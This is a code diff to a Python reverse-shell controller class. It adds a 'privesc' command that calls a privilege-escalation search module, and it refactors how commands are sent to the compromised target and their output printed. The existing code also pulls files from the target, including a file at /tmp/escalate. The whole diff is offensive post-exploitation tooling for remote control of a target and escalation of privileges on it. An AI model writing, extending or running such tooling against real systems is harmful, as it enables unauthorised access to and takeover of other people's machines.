@@ -1,6 +1,7 @@
 from listener import PortListener
 from cli import CLI
 from file_transfer import FileTransfer
+from privilege_escalation import PrivilegeEscalation
 
 
 class ReverseShell:
@@ -21,8 +22,12 @@ class ReverseShell:
     def main_loop(self):
         new_command = self.cli.cli_prompt()
         new_command = self.handle_command(new_command)
-        return_value = self.listener.send_receive(new_command)
+        self.run_command_and_print(new_command)
+
+    def run_command_and_print(self, command):
+        return_value = self.listener.send_receive(command)
         self.cli.cli_print(return_value)
+        return return_value
 
     def handle_command(self, command):
         if command.lower() in ["bye"]:
@@ -36,6 +41,9 @@ class ReverseShell:
             return ""
         if command.lower() == "filedownload":
             self.receive_file("/tmp/escalate", "/tmp/escalate")
+            return ""
+        if command.lower() == "privesc":
+            self.search_for_privesc()
             return ""
         return command + "\n"
 
@@ -59,3 +67,7 @@ class ReverseShell:
         file_transfer = FileTransfer(self.host_ip, self.host_port + 1, self)
         file_transfer.target_to_host(source_file_path, destination_file_path)
         file_transfer.close()
+
+    def search_for_privesc(self):
+        privilege_escalation = PrivilegeEscalation(self)
+        privilege_escalation.search_for_privesc()
